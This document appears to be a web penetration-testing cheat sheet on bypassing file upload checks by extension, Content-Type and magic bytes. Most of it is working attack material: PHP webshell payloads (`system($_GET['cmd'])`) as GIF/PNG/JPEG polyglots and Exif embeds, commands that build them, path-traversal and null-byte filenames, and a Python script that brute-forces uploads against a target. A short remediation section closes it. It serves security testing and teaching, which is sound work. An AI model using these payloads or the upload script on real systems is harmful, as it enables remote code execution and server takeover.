# File Type Bypass (MIME, Extension, Magic Bytes)

## Overview
Applications attempting to restrict file uploads commonly implement one or more of these checks: validating the file extension, checking the `Content-Type` header, and verifying magic bytes (file signature). Each of these controls can be bypassed individually or in combination. Since the browser-supplied `Content-Type` and filename are fully attacker-controlled, they provide no security guarantee. Magic byte checks are more robust but can be defeated by prepending valid image headers to malicious code. Understanding all bypass vectors is essential for thorough file upload testing.

## How It Works
- **Extension bypass**: The server checks the file extension (e.g., allows only `.jpg`). Attackers use double extensions (`.php.jpg`), case variation (`.PHP`), alternate extensions (`.php5`, `.phtml`), null bytes to truncate the name, or special characters the server strips.
- **MIME/Content-Type bypass**: The `Content-Type` request header is set by the browser/client and is entirely attacker-controlled. Simply changing it in Burp to `image/jpeg` while sending a PHP file often passes server checks.
- **Magic byte bypass**: The server reads the first few bytes of the file to determine its type. Prepending GIF/PNG/JPEG magic bytes to PHP code creates a file that passes the magic byte check but contains executable PHP after the image header.
- **Combination**: Production systems often use multiple checks — testing must try all combinations systematically.

## Impact
- Bypass of upload restrictions leading to webshell upload and RCE
- Upload of SVG/HTML files leading to XSS
- Upload of oversized files leading to DoS
- Upload of ZIP archives with path traversal (Zip Slip)
- Storage of malicious files that affect other users

## Where to Look
- Any file upload functionality
- Avatar/image upload (check if PHP is blocked)
- Document upload (check if server-side scripts are blocked)
- CMS plugin/theme upload (often only checks extension)
- Import features (CSV, XML, ZIP)
- API endpoints accepting `multipart/form-data`
- Mobile app API upload endpoints (may have weaker validation than web frontend)

## Testing Steps
1. Identify the upload endpoint and the accepted file types.
2. Upload a legitimate file of an accepted type and note the URL where it appears.
3. Try uploading a minimal PHP file (`<?php phpinfo(); ?>`) named `test.php` with `Content-Type: application/x-php` — observe the error message.
4. Note whether the error is about the extension, content type, or content.
5. Systematically try each bypass category below.
6. For each successful upload, browse to the uploaded file URL and attempt to trigger execution.
7. Use the matrix approach: try all extension bypasses × all content-type bypasses × all magic byte strategies.
8. After execution confirmed, escalate to webshell.

## Payloads / Techniques

### Extension Bypasses

**Double extensions (Apache may execute by the first recognized extension):**
```
shell.php.jpg
shell.php.jpeg
shell.php.png
shell.php.gif
shell.php.pdf
```

**Case variation (case-insensitive file system on Windows/macOS):**
```
shell.PHP
shell.Php
shell.pHp
shell.PHP5
```

**Alternative PHP extensions (often enabled in Apache configs):**
```
shell.php
shell.php3
shell.php4
shell.php5
shell.php7
shell.phtml
shell.pht
shell.phps
shell.phar
shell.shtml
```

**Alternative ASP/ASPX extensions:**
```
shell.asp
shell.aspx
shell.asa
shell.asax
shell.ashx
shell.asmx
shell.cer
shell.swf
```

**Alternative JSP extensions:**
```
shell.jsp
shell.jspx
shell.jspf
shell.jsw
shell.jsv
```

**Null byte injection (truncates filename at null byte in some PHP/C backends):**
```
shell.php%00.jpg
shell.php\x00.jpg
shell.php%00.png
```

**Trailing dot or space (Windows filesystem strips trailing dots/spaces):**
```
shell.php.
shell.php 
shell.php....
```

**Semicolon tricks (IIS-specific):**
```
shell.asp;.jpg
shell.aspx;.png
```

**Reverse extension trick:**
```
shell.jpg.php  (if server only checks last extension and it's PHP, still executes)
```

**Path traversal in filename to escape upload directory:**
```
../shell.php
../../shell.php
../uploads/../shell.php
```

### MIME / Content-Type Bypasses

Allowed Content-Types for images to try when submitting malicious files:
```
Content-Type: image/jpeg
Content-Type: image/png
Content-Type: image/gif
Content-Type: image/webp
Content-Type: image/svg+xml
Content-Type: application/octet-stream
Content-Type: text/plain
```

**Burp modification example (original request):**
```http
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----BurpBoundary

------BurpBoundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/x-php

<?php system($_GET['cmd']); ?>
------BurpBoundary--
```

**Modified to bypass MIME check:**
```http
------BurpBoundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
------BurpBoundary--
```

### Magic Byte Bypasses

**Prepend GIF magic bytes to PHP code:**
```
GIF89a<?php system($_GET['cmd']); ?>
```
Save as `shell.php` — passes GIF magic byte check, executes as PHP.

**Prepend PNG magic bytes (binary):**
```bash
printf '\x89PNG\r\n\x1a\n' > shell.php
echo '<?php system($_GET["cmd"]); ?>' >> shell.php
```

**Prepend JPEG magic bytes:**
```bash
printf '\xff\xd8\xff\xe0' > shell.php
echo '<?php system($_GET["cmd"]); ?>' >> shell.php
```

**Embed PHP in JPEG Exif data (ExifTool):**
```bash
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
# Rename to shell.php after if extension check is weak
mv image.jpg shell.php
```

**Polyglot: Valid GIF that is also valid PHP:**
```
GIF89a/*<?php system($_GET["cmd"]); ?>*/=1;
```
This is a valid GIF header followed by PHP code that also parses as JavaScript comment, making it polyglot across multiple contexts.

### Content Sniffing Bypass

**If the server checks the first N bytes but not the full file:**
```php
// Create file with long valid header then malicious payload
python3 -c "
import sys
# Write 512 bytes of valid JPEG data
sys.stdout.buffer.write(b'\xff\xd8\xff\xe0' + b'\x00' * 508)
print('<?php system(\$_GET[\"cmd\"]); ?>')
" > polyglot_shell.php
```

### Complete Matrix Test Script

```python
import requests

TARGET = "https://victim.com/upload"
COOKIES = {"session": "your_session_here"}
PAYLOAD = b"<?php system($_GET['cmd']); ?>"

extensions = [".php", ".php5", ".phtml", ".pht", ".PHP", ".php.jpg",
              ".jpg.php", ".php%00.jpg", ".php.", ".phar"]
content_types = ["image/jpeg", "image/png", "image/gif",
                 "application/octet-stream", "text/plain"]
magic_prefixes = [b"", b"GIF89a", b"\xff\xd8\xff\xe0", b"\x89PNG\r\n\x1a\n"]

for ext in extensions:
    for ct in content_types:
        for magic in magic_prefixes:
            filename = f"shell{ext}"
            content = magic + PAYLOAD
            files = {"file": (filename, content, ct)}
            try:
                r = requests.post(TARGET, files=files, cookies=COOKIES)
                if r.status_code == 200 and "error" not in r.text.lower():
                    print(f"[SUCCESS] ext={ext}, ct={ct}, magic={magic[:4]}")
                    print(f"  Response: {r.text[:100]}")
            except Exception as e:
                print(f"Error: {e}")
```

## Burp Suite Tips
- Use **Burp Repeater** to manually test each combination of extension, Content-Type, and file content by modifying the multipart body.
- The **Upload Scanner** Burp extension automates the bypass matrix: it tests dozens of extension/MIME combinations automatically.
- Use **Burp Intruder** in "Pitchfork" mode with separate payload lists for extensions and content types to test all combinations.
- Intercept the legitimate upload in **Proxy** and use "Change body encoding" to switch between form-encoded and multipart if needed.
- Use **Burp Decoder** to insert null bytes (`\x00`) into filenames: type the filename, highlight it, decode, insert null byte in hex view.
- Watch for different error messages in responses — they reveal which check is failing (extension vs. MIME vs. content).
- In **Burp's HTTP history**, filter by "multipart" content type to find all upload-related requests in scope.

## Tools
- Burp Suite Pro (Upload Scanner extension, Intruder, Repeater)
- Upload Scanner — https://github.com/modzero/mod0BurpUploadScanner
- ExifTool — https://exiftool.org/ (embed payloads in image metadata)
- file command / libmagic (verify magic bytes locally)
- python-magic library (local magic byte testing)
- ffuf (parameter fuzzing for upload parameters)
- Metasploit `multi/handler` (for reverse shell)

## Remediation
- **Allowlist extensions server-side**: Only permit specific known-safe extensions. Reject all others with a 400 response.
- **Ignore client-supplied Content-Type**: Never make security decisions based on the `Content-Type` header in the request.
- **Validate magic bytes with a proper library**: Use `python-magic`, `file-type` (Node.js), `Apache Tika`, or equivalent — not a simple byte comparison.
- **Rename files**: Always rename uploaded files to a random UUID with a fixed, safe extension. Never preserve the user-supplied filename.
- **Serve from separate origin**: Upload files to object storage (S3, GCS) and serve from a CDN domain with no server-side execution.
- **Disable execution in upload directories**: Use web server config (Apache `Options -ExecCGI`, Nginx `location` block) to prevent execution.
- **Use a virus scanner**: Integrate ClamAV or a cloud malware scanning API into the upload pipeline.
- **Limit file size**: Enforce a maximum file size server-side to prevent DoS.

## References
https://portswigger.net/web-security/file-upload
https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files
https://book.hacktricks.xyz/pentesting-web/file-upload
